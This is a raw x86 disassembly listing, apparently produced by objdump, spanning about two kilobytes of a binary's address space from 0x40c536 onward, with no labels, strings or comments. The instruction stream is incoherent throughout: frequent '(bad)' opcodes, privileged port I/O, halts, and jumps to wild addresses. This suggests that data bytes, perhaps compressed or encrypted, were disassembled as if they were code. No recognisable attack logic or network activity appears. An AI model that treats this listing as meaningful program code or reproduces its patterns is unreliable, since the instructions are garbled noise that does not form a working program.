  40c536:	out    0xe6,al
  40c538:	test   al,0xed
  40c53a:	into   
  40c53b:	loope  0x40c533
  40c53d:	in     eax,0xb4
  40c53f:	clc    
  40c540:	ror    ebp,cl
  40c542:	rcl    al,1
  40c544:	imul   edi
  40c546:	out    dx,al
  40c547:	add    bh,bl
  40c549:	shl    cl,0x4
  40c54c:	or     edi,edi
  40c54e:	std    
  40c54f:	test   DWORD PTR [edx+ebx*8],0xaa13cbdc
  40c556:	fdiv   st,st(2)
  40c558:	(bad)  
  40c559:	int    0xc6
  40c55b:	enter  0xb5c4,0xe4
  40c55f:	clc    
  40c560:	shr    eax,cl
  40c562:	mov    ebx,0xc0b8cfec
  40c567:	cli    
  40c568:	add    dh,dh
  40c56a:	jmp    0x40c529
  40c56c:	add    al,0xfe
  40c56e:	or     bl,dl
  40c570:	(bad)  
  40c572:	in     al,0xea
  40c574:	(bad)  
  40c575:	shr    esi,1
  40c577:	mov    al,0xac
  40c579:	leave  
  40c57a:	in     al,0xc5
  40c57c:	mov    ebx,0xebfab7e4
  40c581:	icebp  
  40c582:	sti    
  40c583:	mov    eax,0xf2e2cc01
  40c588:	(bad)  
  40c589:	mov    edi,0xf4dcd2e3
  40c58e:	(bad)  
  40c590:	fldln2 
  40c592:	add    eax,0xd3e8dfc9
  40c597:	rcl    ebx,1
  40c599:	hlt    
  40c59a:	lock mov dh,0xb3
  40c59d:	(bad)
  40c5a0:	mov    eax,0xefb9fac9
  40c5a5:	mov    esp,0xd0d2d4fa
  40c5aa:	rol    BYTE PTR [edi],0xe3
  40c5ad:	ror    cl,0xd9
  40c5b0:	pmaddwd mm5,mm0
  40c5b3:	jmp    0x40c587
  40c5b5:	jmp    0xb6edb260
  40c5ba:	in     al,0xb3
  40c5bc:	mov    dh,0xb3
  40c5be:	fcom   st(7)
  40c5c0:	fdivrp st(1),st
  40c5c2:	out    dx,al
  40c5c3:	out    dx,al
  40c5c4:	aam    0xbe
  40c5c6:	(bad)  
  40c5c7:	mov    edi,0xf4ddc7f9
  40c5cc:	fmul   QWORD PTR [edx]
  40c5ce:	loope  0x40c5b4
  40c5d0:	or     ah,dl
  40c5d2:	into   
  40c5d3:	out    dx,al
  40c5d4:	adc    ch,dh
  40c5d6:	jmp    0x40c5a6
  40c5d8:	lods   al,BYTE PTR ds:[esi]
  40c5d9:	shl    BYTE PTR [edi-0x43e122d],1
  40c5df:	mov    ah,0xe9
  40c5e1:	(bad)  
  40c5e2:	icebp  
  40c5e3:	push   ecx
  40c5e5:	(bad)  
  40c5e7:	mov    esi,0xc7be06e1
  40c5ec:	stc    
  40c5ed:	shl    dl,1
  40c5ef:	out    0xc7,al
  40c5f1:	aam    0xb
  40c5f3:	add    eax,0xe4c1eb07
  40c5f8:	shl    dh,1
  40c5fa:	retf   
  40c5fb:	aam    0xea
  40c5fd:	loopne 0x40c5ef
  40c5ff:	int    0xb0
  40c601:	mov    ah,0xcf
  40c603:	in     eax,dx
  40c604:	lock ret 
  40c606:	(bad)  
  40c607:	fcmovu st,st(2)
  40c609:	repz cmc 
  40c60b:	push   es
  40c60c:	out    0x4,eax
  40c60e:	jecxz  0x40c5ef
  40c610:	fsubr  st,st(4)
  40c612:	int    0xce
  40c614:	or     BYTE PTR [ecx-0xb214f4f],bh
  40c61a:	mov    dh,0xad
  40c61c:	mov    bl,0xf0
  40c61e:	fcom   st(3)
  40c620:	mov    ebx,0xd9dce3bd
  40c625:	aam    0xc3
  40c627:	aad    0xbf
  40c629:	icebp  
  40c62a:	loop   0x40c60c
  40c62c:	repnz add eax,0xd4f4fbdc
  40c632:	les    ecx,FWORD PTR [esp+ecx*1]
  40c635:	loope  0x40c61a
  40c637:	fsubr  st(1),st
  40c639:	div    ah
  40c63b:	les    esi,FWORD PTR [ecx-0x2c19384e]
  40c641:	fucomi st,st(0)
  40c643:	in     al,dx
  40c644:	fcomi  st,st(3)
  40c646:	mov    esp,0xfddff7cd
  40c64b:	jmp    0xd9d8:0xf80ae0fa
  40c652:	out    dx,al
  40c653:	shl    esp,0xe1
  40c656:	loopne 0x40c628
  40c658:	(bad)  
  40c65a:	jmp    0x40c641
  40c65c:	sti    
  40c65d:	mov    bh,0xf1
  40c65f:	mov    eax,0xbfd0e4cf
  40c664:	not    ebx
  40c666:	lock loop 0x40c657
  40c669:	mov    edi,0xfcd0c7f6
  40c66e:	cmc    
  40c66f:	loop   0x40c66e
  40c671:	fmul   DWORD PTR [ebx]
  40c673:	out    0xc9,al
  40c675:	mov    eax,0xf5cdcaaf
  40c67a:	jmp    0xc7f2b751
  40c67f:	xlat   BYTE PTR ds:[ebx]
  40c680:	in     eax,dx
  40c681:	mov    edi,0xd8d1cddd
  40c686:	fdivr  st,st(5)
  40c688:	in     eax,dx
  40c689:	fiadd  DWORD PTR [esi]
  40c68b:	(bad)  
  40c68c:	std    
  40c68d:	cmc    
  40c68e:	fincstp 
  40c690:	call   0xf0a9e9d
  40c695:	jmp    0x40c689
  40c697:	(bad)
  40c69a:	loope  0x40c65c
  40c69c:	lock enter 0xf4f8,0xed
  40c6a1:	aam    0xf0
  40c6a3:	repnz (bad) 
  40c6a6:	mov    ecx,0xfdd2ecce
  40c6ab:	mov    ecx,0xfed7f8fb
  40c6b0:	into   
  40c6b1:	sti    
  40c6b2:	add    bh,ch
  40c6b4:	jmp    0xd600b07c
  40c6b9:	out    dx,al
  40c6ba:	in     eax,0xd6
  40c6bc:	repz ror esp,0xc8
  40c6c0:	out    0xb5,al
  40c6c2:	in     eax,dx
  40c6c3:	rcr    bl,cl
  40c6c5:	into   
  40c6c6:	fcomp  st(3)
  40c6c8:	loop   0x40c68d
  40c6ca:	(bad)  
  40c6cb:	rol    edi,1
  40c6cd:	retf   0xdfcb
  40c6d0:	into   
  40c6d1:	cmc    
  40c6d2:	stc    
  40c6d3:	or     cl,bh
  40c6d5:	(bad)  
  40c6d7:	repnz retf 
  40c6d9:	jmp    0xb226aa9f
  40c6de:	int3   
  40c6df:	int3   
  40c6e0:	mov    ah,0xd5
  40c6e2:	(bad)  
  40c6e3:	mov    ecx,0xe6bee9cd
  40c6e8:	mov    esp,0xf5c6fdc7
  40c6ed:	(bad)  
  40c6f0:	loopne 0x40c6bb
  40c6f2:	retf   
  40c6f3:	cli    
  40c6f4:	in     eax,dx
  40c6f5:	out    0xc4,al
  40c6f7:	repnz int 0xe1
  40c6fa:	rol    cl,0xe5
  40c6fd:	cmc    
  40c6fe:	mov    bh,0xd4
  40c700:	mov    eax,0xe9fbb5ed
  40c705:	cld    
  40c706:	into   
  40c707:	mov    ebp,0xe6fbf4da
  40c70c:	std    
  40c70d:	or     cl,BYTE PTR [edx]
  40c70f:	loop   0x40c715
  40c711:	cld    
  40c712:	in     eax,0xfb
  40c714:	loope  0x40c6d2
  40c716:	mov    cl,0xc2
  40c718:	jecxz  0x40c6c7
  40c71a:	out    dx,al
  40c71b:	cmc    
  40c71c:	repnz mov bl,0xb6
  40c71f:	in     al,dx
  40c720:	(bad)  
  40c723:	rcr    eax,cl
  40c725:	mov    esi,0xe2d1feba
  40c72a:	repnz rol BYTE PTR [edi],0xff
  40c72e:	shl    ch,0xe6
  40c731:	int    0xef
  40c733:	or     eax,0xcef3d2d3
  40c738:	jmp    0x40c722
  40c73a:	out    dx,al
  40c73b:	out    0xd5,al
  40c73d:	(bad)  
  40c73e:	hlt    
  40c73f:	clc    
  40c740:	(bad)  
  40c741:	aam    0xef
  40c743:	fld    DWORD PTR [ebx]
  40c745:	(bad)  
  40c746:	shl    eax,cl
  40c748:	ret    0x2fa
  40c74b:	mov    ebp,0xa07f8fb
  40c750:	fadd   DWORD PTR [esi]
  40c752:	loop   0x40c73c
  40c754:	stc    
  40c755:	repnz fmul st,st(6)
  40c758:	jmp    0xe9b9:0xd3d7b5dc
  40c75f:	into   
  40c760:	into   
  40c761:	mov    ebx,0xf8eeddba
  40c766:	ret    0xd6d1
  40c769:	(bad)  
  40c76a:	aad    0xd3
  40c76c:	add    eax,0xf5ea06df
  40c771:	or     al,0xcd
  40c773:	add    dl,BYTE PTR [ecx]
  40c775:	lods   al,BYTE PTR ds:[esi]
  40c776:	retf   
  40c777:	rcl    edx,cl
  40c779:	repnz aad 0xed
  40c77c:	fxch   st(2)
  40c77e:	repnz clc 
  40c780:	aam    0xf6
  40c782:	shl    edx,1
  40c784:	sar    BYTE PTR [ebp-0x2024084a],1
  40c78a:	stc    
  40c78b:	sar    DWORD PTR [edi+eiz*8-0x5f20530],cl
  40c792:	call   0xbd03b59b
  40c797:	lods   al,BYTE PTR ds:[esi]
  40c798:	mov    dh,0xcd
  40c79a:	leave  
  40c79b:	test   eax,0xf0d7f5d3
  40c7a0:	sti    
  40c7a1:	aam    0xd4
  40c7a3:	sar    bh,1
  40c7a5:	cmc    
  40c7a6:	mov    eax,0xd6f4bdd6
  40c7ab:	(bad)  
  40c7ad:	add    al,BYTE PTR [edx]
  40c7af:	(bad)  
  40c7b0:	(bad)  
  40c7b1:	in     al,0x13
  40c7b3:	iret   
  40c7b4:	loope  0x40c75e
  40c7b6:	shr    BYTE PTR [edi-0x3a2a3835],0xb7
  40c7bd:	mov    dh,0xf6
  40c7bf:	out    0xda,al
  40c7c1:	leave  
  40c7c2:	mov    esi,0xf5f7e2ec
  40c7c7:	repnz push es
  40c7c9:	stc    
  40c7ca:	cmc    
  40c7cb:	cmc    
  40c7cc:	jmp    0x40c7ad
  40c7ce:	(bad)  
  40c7cf:	(bad)  
  40c7d0:	fsubr  st(3),st
  40c7d2:	fsub   st,st(2)
  40c7d4:	or     al,dl
  40c7d6:	lods   eax,DWORD PTR ds:[esi]
  40c7d7:	(bad)  
  40c7d9:	jmp    0xf6259ed9
  40c7de:	int    0xc5
  40c7e0:	(bad)  
  40c7e1:	in     eax,dx
  40c7e2:	cld    
  40c7e3:	hlt    
  40c7e4:	jmp    0xd3fec3c8
  40c7e9:	repz icebp 
  40c7eb:	(bad)  
  40c7ec:	(bad)  
  40c7ed:	std    
  40c7ee:	dec    bl
  40c7f0:	jecxz  0x40c7df
  40c7f2:	add    cl,BYTE PTR [eax]
  40c7f4:	out    dx,eax
  40c7f5:	jmp    0xd02aa9bd
  40c7fa:	mov    ch,0xb4
  40c7fc:	icebp  
  40c7fd:	aad    0xcc
  40c7ff:	mov    eax,0xfacfc9be
  40c804:	cmc    
  40c805:	mov    ebx,0xddfbefed
  40c80a:	add    dl,bl
  40c80c:	stc    
  40c80d:	(bad)  
  40c80e:	jecxz  0x40c807
  40c810:	mul    ah
  40c812:	jmp    0xe6c5:0xb8cc04de
  40c819:	mov    al,0xe3
  40c81b:	loope  0x40c7f8
  40c81d:	jmp    0x40c7e5
  40c81f:	mov    dh,0xff
  40c821:	mov    edi,0xddd3bcc8
  40c826:	clc    
  40c827:	cli    
  40c828:	rol    bh,cl
  40c82a:	xlat   BYTE PTR ds:[ebx]
  40c82b:	loopne 0x40c811
  40c82d:	add    al,0xf4
  40c82f:	(bad)  
  40c830:	cld    
  40c831:	aad    0xeb
  40c833:	add    dh,ch
  40c835:	scas   al,BYTE PTR es:[edi]
  40c836:	shl    esi,0xe7
  40c839:	mov    al,0xdb
  40c83b:	in     eax,dx
  40c83c:	sti    
  40c83d:	cli    
  40c83e:	retf   0xf3b4
  40c841:	mov    ch,0xdf
  40c843:	fcmovne st,st(7)
  40c845:	icebp  
  40c846:	in     al,dx
  40c847:	div    BYTE PTR [eax+eiz*8-0x39f6fd05]
  40c84e:	(bad)  
  40c84f:	out    dx,al
  40c850:	jmp    0xa6d8:0x704c8ce
  40c857:	loop   0x40c80c
  40c859:	ret    0xe2ad
  40c85c:	rcr    dl,cl
  40c85e:	int    0xf9
  40c860:	shr    esp,1
  40c862:	jmp    0xf806:0xf7c9e1b8
  40c869:	(bad)  
  40c86b:	add    esp,edi
  40c86d:	jmp    0xe2db:0xebdce306
  40c874:	adc    ebp,DWORD PTR [edi-0x4c573c1e]
  40c87a:	mov    bh,0xd5
  40c87c:	aam    0xc4
  40c87e:	mov    eax,0xbbcfb5c5
  40c883:	mov    cl,0xfe
  40c885:	mov    eax,0xc2c7dbcd
  40c88a:	mov    ebp,0xfde0d0e1
  40c88f:	(bad)  
  40c890:	call   0xc853c759
  40c895:	in     eax,0xdf
  40c897:	iret   
  40c898:	in     al,dx
  40c899:	call   0xd5fc8e4c
  40c89e:	icebp  
  40c89f:	int    0xd2
  40c8a1:	shl    esi,cl
  40c8a3:	repz mov esi,0xfdf0e7bf
  40c8a9:	ret    
  40c8aa:	dec    BYTE PTR [edx]
  40c8ac:	shl    ch,0x7
  40c8af:	(bad)  
  40c8b0:	jecxz  0x40c892
  40c8b2:	out    0xcd,eax
  40c8b4:	enter  0xddac,0xce
  40c8b8:	rol    bh,0xf5
  40c8bb:	(bad)  
  40c8bc:	div    ebp
  40c8be:	imul   bh
  40c8c0:	(bad)  
  40c8c1:	in     eax,0xc9
  40c8c3:	ret    
  40c8c4:	lock out dx,al
  40c8c6:	icebp  
  40c8c7:	shl    cl,1
  40c8c9:	(bad)  
  40c8ca:	lock std 
  40c8cc:	add    cl,BYTE PTR [ebx]
  40c8ce:	add    eax,0xfce001c0
  40c8d3:	retf   0xecfd
  40c8d6:	mov    eax,0xd0e5cbc2
  40c8db:	jmp    0xca1cc08c
  40c8e0:	std    
  40c8e1:	mov    ebp,0xc9d1b1e4
  40c8e6:	pop    es
  40c8e7:	aam    0xd0
  40c8e9:	mov    esp,0xe6c2f2c3
  40c8ee:	test   ebx,0xdacce1ce
  40c8f4:	iret   
  40c8f5:	in     eax,dx
  40c8f6:	mov    edi,0xe2e5b3ce
  40c8fb:	out    dx,eax
  40c8fc:	retf   0xeff0
  40c8ff:	fdiv   DWORD PTR [edi-0x37151b2d]
  40c905:	mov    bh,0xb9
  40c907:	pop    es
  40c908:	in     al,dx
  40c909:	loopne 0x40c8d2
  40c90b:	(bad)  
  40c90c:	jmp    0x40c919
  40c90e:	in     al,0xd7
  40c910:	fadd   st,st(4)
  40c912:	push   es
  40c913:	out    dx,eax
  40c914:	add    ch,al
  40c916:	test   al,0xcd
  40c918:	scas   al,BYTE PTR es:[edi]
  40c919:	xlat   BYTE PTR ds:[ebx]
  40c91a:	into   
  40c91b:	icebp  
  40c91c:	loopne 0x40c8f9
  40c91e:	mov    bh,0xc4
  40c920:	in     al,dx
  40c921:	repnz (bad) 
  40c924:	add    edi,DWORD PTR [edi+0x4f8b8d8]
  40c92a:	add    eax,esp
  40c92c:	idiv   ebp
  40c92e:	shr    ecx,0xf8
  40c931:	push   cs
  40c932:	fmul   st,st(3)
  40c934:	cli    
  40c935:	out    dx,eax
  40c936:	jmp    0x40c905
  40c938:	xlat   BYTE PTR ds:[ebx]
  40c939:	retf   
  40c93a:	in     al,dx
  40c93b:	hlt    
  40c93c:	mov    cl,0xcc
  40c93e:	call   0xf10679f0
  40c943:	int3   
  40c944:	sti    
  40c945:	rcr    ch,1
  40c947:	(bad)  
  40c948:	rol    edi,1
  40c94a:	add    al,0xe2
  40c94c:	sar    bh,1
  40c94e:	(bad)  [ebx]
  40c950:	in     eax,0x7
  40c952:	add    eax,0xbed1d8cb
  40c957:	int3   
  40c958:	mov    ebp,0xebcdd3e0
  40c95d:	fyl2x  
  40c95f:	repz aam 0xc9
  40c962:	(bad)  
  40c963:	jmp    0x40c94e
  40c965:	iret   
  40c966:	hlt    
  40c967:	in     eax,dx
  40c968:	int    0xfa
  40c96a:	out    0xe0,al
  40c96c:	rcr    esi,0xe8
  40c96f:	ud2    
  40c971:	(bad)  
  40c972:	dec    ah
  40c974:	clc    
  40c975:	lods   al,BYTE PTR ds:[esi]
  40c976:	into   
  40c977:	loope  0x40c970
  40c979:	in     al,0xb5
  40c97b:	mov    ebx,0xc6eff3eb
  40c980:	std    
  40c981:	(bad)  
  40c983:	std    
  40c984:	out    dx,eax
  40c985:	test   cl,0xd8
  40c988:	ret    
  40c989:	hlt    
  40c98a:	add    eax,0xe1fedce3
  40c98f:	out    dx,eax
  40c990:	leave  
  40c991:	std    
  40c992:	or     eax,DWORD PTR [eax]
  40c994:	adc    esi,ebx
  40c996:	(bad)  
  40c997:	test   al,0xe7
  40c999:	div    edi
  40c99b:	loopne 0x40c98c
  40c99d:	shl    eax,0xe6
  40c9a0:	mov    bh,0xb8
  40c9a2:	in     al,0xf9
  40c9a4:	fprem  
  40c9a6:	fucomi st,st(6)
  40c9a8:	shl    edi,cl
  40c9aa:	jmp    0x40c971
  40c9ac:	ret    
  40c9ad:	(bad)  
  40c9af:	push   es
  40c9b0:	sti    
  40c9b1:	add    DWORD PTR [esi],eax
  40c9b3:	adc    esp,edx
  40c9b5:	mov    dl,0xae
  40c9b7:	mov    dl,0xe3
  40c9b9:	(bad)  
  40c9ba:	lods   eax,DWORD PTR ds:[esi]
  40c9bb:	mov    ch,0xeb
  40c9bd:	jmp    0xbed0:0xfcd2d6e8
  40c9c4:	aad    0xcf
  40c9c6:	fadd   st,st(0)
  40c9c8:	int3   
  40c9c9:	sar    BYTE PTR [esi-0x3617200d],0xe2
  40c9d0:	frndint 
  40c9d2:	clc    
  40c9d3:	fimul  WORD PTR [eax]
  40c9d5:	test   eax,0xe1d7b3d7
  40c9da:	mov    cl,0xad
  40c9dc:	in     al,0xe5
  40c9de:	mov    bh,0xe5
  40c9e0:	mov    al,0xcb
  40c9e2:	jecxz  0x40c9e0
  40c9e4:	sti    
  40c9e5:	mov    ecx,0xd9cddbef
  40c9ea:	push   es
  40c9eb:	std    
  40c9ec:	(bad)  
  40c9ed:	hlt    
  40c9ee:	or     esp,edx
  40c9f0:	loope  0x40c9d1
  40c9f2:	fmulp  st(2),st
  40c9f4:	fisubr DWORD PTR [edi-0x521a3940]
  40c9fa:	leave  
  40c9fb:	out    0xf5,eax
  40c9fd:	(bad)  
  40c9fe:	retf   
  40c9ff:	repnz lock fstp TBYTE PTR [ecx-0x2a0f0005]
  40ca07:	sar    esi,0xd8
  40ca0a:	(bad)  
  40ca0b:	rol    eax,cl
  40ca0d:	loope  0x40c9f5
  40ca0f:	aad    0xe3
  40ca11:	ret    
  40ca12:	or     bl,dl
  40ca14:	or     eax,0xb2deb3b9
  40ca19:	jecxz  0x40c9ed
  40ca1b:	aad    0xcc
  40ca1d:	lds    esi,FWORD PTR [edx-0x4b132421]
  40ca23:	mov    esp,0xd8d7f6d0
  40ca28:	int3   
  40ca29:	in     eax,dx
  40ca2a:	aad    0xfa
  40ca2c:	jmp    0xff0b9027
  40ca31:	cmc    
  40ca32:	int3   
  40ca33:	cli    
  40ca34:	fmul   st,st(3)
  40ca36:	enter  0xe0be,0xae
  40ca3a:	int3   
  40ca3b:	ret    
  40ca3c:	int    0xaf
  40ca3e:	(bad)  
  40ca40:	not    edi
  40ca42:	repnz int3 
  40ca44:	out    dx,al
  40ca45:	repz add BYTE PTR [ebp-0x3b3e403e],dh
  40ca4c:	add    ecx,DWORD PTR [ebx]
  40ca4e:	loope  0x40ca18
  40ca50:	(bad)  
  40ca51:	loope  0x40ca15
  40ca53:	or     al,0xf
  40ca55:	shl    eax,cl
  40ca57:	fsub   st(3),st
  40ca59:	mov    ch,0xcf
  40ca5b:	hlt    
  40ca5c:	(bad)  
  40ca5e:	(bad)  
  40ca5f:	mov    ebx,0xbde4e4cc
  40ca64:	in     al,dx
  40ca65:	add    edx,edx
  40ca67:	sar    DWORD PTR [ebp-0x26f4ffff],cl
  40ca6d:	jmp    0xc401ac39
  40ca72:	fxch   st(2)
  40ca74:	add    ebp,DWORD PTR [ebx-0x42305020]
  40ca7a:	fdiv   QWORD PTR [ebx+ecx*8-0x170d054f]
  40ca81:	xlat   BYTE PTR ds:[ebx]
  40ca82:	icebp  
  40ca83:	(bad)  [edx+eax*8-0x42184a3d]
  40ca8a:	cld    
  40ca8b:	repz (bad) 
  40ca8d:	jmp    0x909:0xd5fccfc4
  40ca94:	rcr    dh,0xe3
  40ca97:	iret   
  40ca98:	scas   al,BYTE PTR es:[edi]
  40ca99:	mov    bl,0xaa
  40ca9b:	mov    bh,0xef
  40ca9d:	in     al,dx
  40ca9e:	leave  
  40ca9f:	retf   
  40caa0:	out    dx,al
  40caa1:	mov    ch,0xf3
  40caa3:	cli    
  40caa4:	sti    
  40caa5:	add    al,BYTE PTR [edi]
  40caa7:	clc    
  40caa8:	add    bh,BYTE PTR [edi+edi*8-0x394018f6]
  40caaf:	loopne 0x40ca93
  40cab1:	loope  0x40caa1
  40cab3:	in     al,dx
  40cab4:	shl    ebp,cl
  40cab6:	(bad)  
  40cab8:	mov    al,0xeb
  40caba:	mov    dh,0xb5
  40cabc:	cli    
  40cabd:	retf   0xdff4
  40cac0:	mov    eax,0xd2edfbcf
  40cac5:	stc    
  40cac6:	xlat   BYTE PTR ds:[ebx]
  40cac7:	lock (bad) 
  40caca:	mov    ebp,0xc2def6c7
  40cacf:	or     edi,esp
  40cad1:	or     eax,0xbdebddd9
  40cad6:	ret    0xe5b2
  40cad9:	mov    bh,0xaa
  40cadb:	out    0xc8,al
  40cadd:	lds    esi,FWORD PTR [esi-0x43240f35]
  40cae3:	ret    
  40cae4:	fxch   st(7)
  40cae6:	neg    esi
  40cae8:	shl    bh,0xf7
  40caeb:	imul   dl
  40caed:	rol    ch,1
  40caef:	add    ecx,DWORD PTR [ebx]
  40caf1:	out    0xcf,eax
  40caf3:	(bad)
  40caf6:	scas   al,BYTE PTR es:[edi]
  40caf7:	jmp    0xc20976a4
  40cafc:	enter  0xd5c6,0xfa
  40cb00:	(bad)  
  40cb01:	sti    
  40cb02:	shl    ecx,cl
  40cb04:	repz int3 
  40cb06:	iret   
  40cb07:	xlat   BYTE PTR ds:[ebx]
  40cb08:	cli    
  40cb09:	aam    0xd6
  40cb0b:	vpmulhw xmm1,xmm7,XMMWORD PTR [edx]
  40cb0f:	aad    0xe9
  40cb11:	out    0xcf,al
  40cb13:	or     BYTE PTR [ebx],cl
  40cb15:	loope  0x40caf5
  40cb17:	test   al,0xb0
  40cb19:	jmp    0xb5d8:0xd0d5f2e8
  40cb20:	in     eax,0xfd
  40cb22:	jmp    0xc2dc:0xd5fcbefe
  40cb29:	aam    0xd6
  40cb2b:	out    0xe0,al
  40cb2d:	cld    
  40cb2e:	add    al,0xe7
  40cb30:	loopne 0x40cb3c
  40cb32:	jmp    0xc7bc:0xa9bd13cb
  40cb39:	out    dx,al
  40cb3a:	in     eax,0xc1
  40cb3c:	mov    ah,0xf6
  40cb3e:	inc    ebp
  40cb40:	enter  0xbdd3,0xfa
  40cb44:	lock mov bh,0xc1
  40cb47:	(bad)  
  40cb49:	ret    
  40cb4a:	stc    
  40cb4b:	(bad)
  40cb4e:	test   BYTE PTR [ebx],0xed
  40cb51:	(bad)  
  40cb52:	or     eax,0xcef30bf3
  40cb57:	shr    edi,1
  40cb59:	cmc    
  40cb5a:	lock into 
  40cb5c:	in     al,dx
  40cb5d:	loopne 0x40cb56
  40cb5f:	enter  0xe8f7,0xf5
  40cb63:	(bad)  
  40cb65:	sti    
  40cb66:	out    dx,al
  40cb67:	fistp  QWORD PTR [edi+ebx*8-0x21290240]
  40cb6e:	retf   
  40cb6f:	or     al,ch
  40cb71:	enter  0xf20a,0xf2
  40cb75:	mov    ecx,0xbcb7c2ea
  40cb7a:	retf   
  40cb7b:	xlat   BYTE PTR ds:[ebx]
  40cb7c:	(bad)  
  40cb7e:	out    0xca,eax
  40cb80:	neg    edi
  40cb82:	in     al,0xc9
  40cb84:	sti    
  40cb85:	fmul   st,st(7)
  40cb87:	cmc    
  40cb88:	cli    
  40cb89:	add    al,0xbe
  40cb8b:	loopne 0x40cb6f
  40cb8d:	clc    
  40cb8e:	xlat   BYTE PTR ds:[ebx]
  40cb8f:	std    
  40cb90:	out    0xff,al
  40cb92:	cli    
  40cb93:	in     al,0xeb
  40cb95:	shl    ah,1
  40cb97:	into   
  40cb98:	lods   eax,DWORD PTR ds:[esi]
  40cb99:	xlat   BYTE PTR ds:[ebx]
  40cb9a:	enter  0xd7d5,0xb0
  40cb9e:	enter  0xdfb8,0xf6
  40cba2:	int    0xd8
  40cba4:	repz in eax,dx
  40cba6:	loopne 0x40cb8e
  40cba8:	out    0x3,al
  40cbaa:	add    bh,BYTE PTR [ecx-0x3f0a171c]
  40cbb0:	into   
  40cbb1:	stc    
  40cbb2:	(bad)  
  40cbb3:	in     al,0x2
  40cbb5:	mov    dl,0xe1
  40cbb7:	loope  0x40cb5d
  40cbb9:	xlat   BYTE PTR ds:[ebx]
  40cbba:	in     eax,0xf5
  40cbbc:	leave  
  40cbbd:	retf   0xcdc4
  40cbc0:	mov    bh,0xda
  40cbc2:	idiv   DWORD PTR [ebp+0x6c2f7f4]
  40cbc8:	fcmovb st,st(1)
  40cbca:	vpandn xmm6,xmm5,xmm0
  40cbce:	fild   DWORD PTR [ebx]
  40cbd0:	(bad)  
  40cbd1:	(bad)  
  40cbd2:	fmul   st(6),st
  40cbd4:	add    esp,eax
  40cbd6:	out    0xc9,al
  40cbd8:	test   al,0xef
  40cbda:	mov    dh,0xbb
  40cbdc:	(bad)  
  40cbdd:	ror    dl,1
  40cbdf:	enter  0xd2f0,0xbe
  40cbe3:	add    dl,ch
  40cbe5:	repz ret 0xdec1
  40cbe9:	fcmovb st,st(4)
  40cbeb:	add    al,0xc1
  40cbed:	call   0xe910a9d7
  40cbf2:	add    BYTE PTR [edi],al
  40cbf4:	cli    
  40cbf5:	into   
  40cbf6:	lock enter 0xeabe,0xf0
  40cbfb:	in     al,dx
  40cbfc:	int3   
  40cbfd:	loopne 0x40cbe5
  40cbff:	hlt    
  40cc00:	mov    esi,0xf0ecf9e8
  40cc05:	sti    
  40cc06:	ret    
  40cc07:	fcmovbe st,st(5)
  40cc09:	(bad)  
  40cc0a:	fcmovnb st,st(3)
  40cc0c:	fyl2xp1 
  40cc0e:	add    cl,BYTE PTR [esi]
  40cc10:	in     eax,0xd4
  40cc12:	fucompp 
  40cc14:	jmp    0xe5e6aaf5
  40cc19:	out    0xed,eax
  40cc1b:	repnz mov dl,0xd8
  40cc1e:	loopne 0x40cbe8
  40cc20:	out    dx,eax
  40cc21:	(bad)  
  40cc22:	mov    esp,0xbcfbd5ed
  40cc27:	mov    eax,0xc50501cc
  40cc2c:	jmp    0x40cc09
  40cc2e:	fdivr  st,st(7)
  40cc30:	retf   0xdfed
  40cc33:	ror    edi,cl
  40cc35:	in     al,dx
  40cc36:	mov    bl,0xf6
  40cc38:	scas   eax,DWORD PTR es:[edi]
  40cc39:	rol    dl,cl
  40cc3b:	ret    
  40cc3c:	mov    al,0xb9
  40cc3e:	mov    eax,0x3c4bac9
  40cc43:	(bad)  
  40cc44:	rcr    ebx,cl
  40cc46:	into   
  40cc47:	repz jecxz 0x40cc25
  40cc4a:	shl    esi,0x5
  40cc4d:	cld    
  40cc4e:	dec    DWORD PTR [edi]
  40cc50:	jmp    0x40cc5b
  40cc52:	fndisi(8087 only) 
  40cc54:	call   0xd1f87304
  40cc59:	in     al,0xd1
  40cc5b:	cmc    
  40cc5c:	(bad)  
  40cc5d:	int    0xca
  40cc5f:	leave  
  40cc60:	into   
  40cc61:	(bad)  
  40cc62:	repnz icebp 
  40cc64:	rol    BYTE PTR [eax],1
  40cc66:	mov    ecx,0xc7c7fcd1
  40cc6b:	loope  0x40cc64
  40cc6d:	retf   
  40cc6e:	(bad)  
  40cc70:	(bad)  
  40cc71:	jmp    0xdfe0:0xe9e3dde0
  40cc78:	loope  0x40cc56
  40cc7a:	(bad)  
  40cc7b:	sti    
  40cc7c:	mov    edx,0xc8eabbc8
  40cc81:	std    
  40cc82:	aam    0xbf
  40cc84:	in     eax,dx
  40cc85:	iret   
  40cc86:	pop    es
  40cc87:	(bad)  
  40cc89:	cmc    
  40cc8a:	aad    0xf0
  40cc8c:	(bad)  
  40cc8d:	fmul   st,st(1)
  40cc8f:	pop    es
  40cc90:	mov    esp,0xf8eec9d4
  40cc95:	out    dx,al
  40cc96:	lods   al,BYTE PTR ds:[esi]
  40cc97:	ror    eax,0xe6
  40cc9a:	mov    bh,0xb7
  40cc9c:	aam    0xf0
  40cc9e:	mov    ch,0xf0
  40cca0:	repz jmp 0x40cc9b
  40cca3:	enter  0xc203,0xc2
  40cca7:	lock cli 
  40cca9:	loop   0x40ccb0
  40ccab:	aam    0xdf
  40ccad:	icebp  
  40ccae:	inc    esp
  40ccb0:	out    dx,al
  40ccb1:	(bad)  
  40ccb2:	or     bh,bh
  40ccb4:	(bad)  
  40ccb5:	out    0xd7,al
  40ccb7:	repz shr edi,cl
  40ccba:	loopne 0x40cca5
  40ccbc:	fxch   st(5)
  40ccbe:	in     al,dx
  40ccbf:	int    0xd5
  40ccc1:	std    
  40ccc2:	aad    0xdd
  40ccc4:	imul   esp
  40ccc6:	into   
  40ccc7:	(bad)  
  40ccc8:	fucom  st(7)
  40ccca:	sti    
  40cccb:	repz mov esp,0xc9fdf0fe
  40ccd1:	loop   0x40ccc0
  40ccd3:	adc    esp,ecx
  40ccd5:	out    dx,eax
  40ccd6:	mov    ebp,0xaee2aca8
  40ccdb:	loop   0x40ccbe
  40ccdd:	shl    ah,cl
  40ccdf:	jmp    0x40ccb8
  40cce1:	mov    ah,0xbf
  40cce3:	hlt    
  40cce4:	ret    
  40cce5:	in     al,dx
  40cce6:	cli    
  40cce7:	mov    edi,0xf1f703bc
  40ccec:	xlat   BYTE PTR ds:[ebx]
  40cced:	in     al,0xd4
  40ccef:	(bad)  
  40ccf0:	into   
  40ccf1:	or     bh,dl
  40ccf3:	cld    
  40ccf4:	or     eax,0xd6e5f0f0
  40ccf9:	int3   
  40ccfa:	mov    bh,0xb3
  40ccfc:	mov    ch,0xd5
  40ccfe:	lds    esi,FWORD PTR [edi-0x313b0803]
